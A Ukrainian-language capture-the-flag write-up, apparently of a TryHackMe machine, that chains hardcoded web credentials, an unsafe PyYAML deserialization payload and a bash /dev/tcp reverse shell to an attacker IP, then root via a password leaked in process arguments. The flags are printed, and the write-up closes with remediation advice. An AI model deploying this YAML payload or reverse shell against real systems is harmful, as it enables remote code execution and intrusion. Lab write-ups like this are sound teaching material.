
# Beach Bar 
### At the Beach Bar, even shell access is complimentary. The jukebox takes requests. Any kind.

Складність: Easy

Ціль: 10.114.176.12

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
   ```bash
      └─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.176.12
   ```

![nmap](./img/nmap.png)

### 1.2. Веб-розвідка:
   Перейшов на:`http://10.114.176.12/login`. Під час перегляду HTML-коду сторінки входу знайшов залишений розробником коментар:
   
![http_comment.png](./img/http_comment.png)

   Таким чином отримав облікові дані: `dj:dj`.
   Після авторизації відкрився dashboard із посиланнями на: `/dashboard`, `/import` та `/export`. Особливо цікавим був `/import`, оскільки сторінка дозволяла завантажувати YAML-файли плейлистів.

## 2. Точка входу (Initial Access / Foothold)

### 2.1. Експлуатація вразливості
   Спочатку через `/export` отримав стандартний YAML-плейлист:
```bash
└─$ cat playlist.yml 
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

   Після цього перевірив, як сервер обробляє YAML. Використав payload:
```bash
└─$ cat playlist_test.yml 
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:os.system ["id"]
  vibe: test
  tracks: []
```

   Сервер повернув:

![playlist_test](./img/playlist_test.png)

   Значення `0` є кодом успішного завершення `os.system()`, що підтвердило можливість виконання довільних команд на сервері.
   Причина вразливості була безпосередньо присутня у вихідному коді вебзастосунку:
```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

   Використання небезпечного `yaml.Loader` дозволяло створювати Python-об'єкти через YAML-теги, зокрема: `!!python/object/apply:os.system`
   Таким чином отримав Remote Code Execution (RCE) від імені користувача вебзастосунку.

### 2.2. Отримання реверс-шеллу
   Для отримання інтерактивного shell використав reverse shell через `Bash`:
```bash
└─$ cat playlist_rev_shell.yml 
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/192.168.158.38/4444 0>&1'"]
  vibe: test
  tracks: []
```

   На Kali запустив listener:
```bash
└─$ nc -lvnp 4444
```

   Результат:

![rev_shell](./img/rev_shell.png)

   Таким чином початковий доступ був отриманий від імені користувача `bartender`. Прапор користувача:
```bash
bartender@tryhackme-2404:/opt/beach-bar/webapp$ cat /home/bartender/user.txt 
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

## 3. Підвищення привілеїв (Privilege Escalation)

### 3.1. Пошук шляхів до `root`
   Спочатку перевірив доступні sudo-привілеї `sudo -l`. Але `sudo` вимагав пароль користувача `bartender`, тому очевидного шляху через `sudo` не було. 
   Також перевірив SUID-файли `find / -perm -4000 -type f 2>/dev/null`. Окрім стандартних системних бінарників Ubuntu, цікавих SUID-файлів не виявив.
   Далі переглянув структуру `/opt/beach-bar`, де було знайдено окремий компонент, що містив файл:
```bash
bartender@tryhackme-2404:/opt/beach-bar/webapp$ ls -la /opt/beach-bar/jukeboxd/
total 12
drwxr-xr-x 2 systemd-coredump ubuntu 4096 Jun 11 13:00 .
drwxr-xr-x 5 systemd-coredump ubuntu 4096 Jun 11 13:21 ..
-rw-r--r-- 1 systemd-coredump ubuntu  623 Jun 11 13:00 jukeboxd.py
```

   Під час дослідження файлу, знайшов, що програма запускається з параметром `--stream-pass`:
```python
parser.add_argument( "--stream-pass", required=True, help="stream backend password" )
```

   Сам файл не був доступний для модифікації користувачу `bartender`. Оскільки `jukeboxd` належав `root` і запускався як окремий сервіс, перевірив його запущений процес через `ps`:
 ```bash
bartender@tryhackme-2404:/opt/beach-bar/webapp$ ps auxww | grep -i '[j]ukebox'
root         616  0.0  0.2  20176 11684 ?        Ss   18:52   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

   Таким чином, у командному рядку процесу, який працював від імені `root`, знаходився пароль `SunsetSpritz2024!`. Цей пароль виявився повторно використаним як пароль облікового запису `root`.

### 3.2. Вертикальне підвищення (`bartender` → `Root`)
   Перевірив знайдений пароль. У результаті отримав root shell:
```bash
bartender@tryhackme-2404:/opt/beach-bar/webapp$ su - root
Password: 
root@tryhackme-2404:~# 
```

   Таким чином отримано повний контроль над системою та фінальний прапор.   

![root_txt.png](./img/root_txt.png)

## Висновки та рекомендації

Основний `attack chain` машини:
```text
Web enumeration
      ↓
Hardcoded DJ credentials (dj:dj)
      ↓
YAML import
      ↓
Unsafe yaml.load(..., Loader=yaml.Loader)
      ↓
Python object deserialization
      ↓
os.system() → RCE
      ↓
Reverse shell as bartender
      ↓
Process enumeration
      ↓
Password exposed in root process arguments
      ↓
Password reuse
      ↓
su - root
      ↓
     ROOT
```

### Основні вразливості
1. Hardcoded credentials у HTML
   Демо-облікові дані `dj:dj` були залишені безпосередньо у вихідному коді сторінки.
   **Рекомендація:** не залишати `production credentials` у frontend-коді та обов'язково змінювати `demo/default credentials` перед розгортанням.

2. Небезпечний YAML parsing
   Використання `yaml.load(content, Loader=yaml.Loader)` дозволило виконувати довільний Python-код через YAML payload.
   **Рекомендація:** для звичайного YAML використовувати `yaml.safe_load(content)` та додатково валідовувати структуру отриманих даних.

3. Пароль `root` у аргументах процесу
   Root-процес запускався з паролем `--stream-pass SunsetSpritz2024!`. Паролі та інші секрети не слід передавати через `command-line arguments`, оскільки вони можуть бути доступні через `/proc` та інструменти на кшталт `ps`.
   **Рекомендація:** використовувати захищені файли конфігурації, `systemd credentials` або інший механізм `secrets management` із відповідними правами доступу.

4. Повторне використання пароля
   Пароль `SunsetSpritz2024!`, який був призначений для `jukeboxd`, виявився паролем `root`.
   **Рекомендація:** використовувати унікальні `credentials` для кожного сервісу та окремого привілейованого користувача.

### Підсумок
   Машина демонструє класичний ланцюжок із декількох слабких місць:
```text   
information disclosure → unsafe deserialization → RCE → credential disclosure → password reuse → root.
```

   Найцікавішою частиною машини була YAML-десеріалізація: зовні це виглядало як звичайний імпорт плейлиста, але використання небезпечного `yaml.Loader` фактично перетворило функцію імпорту на механізм виконання довільного Python-коду.
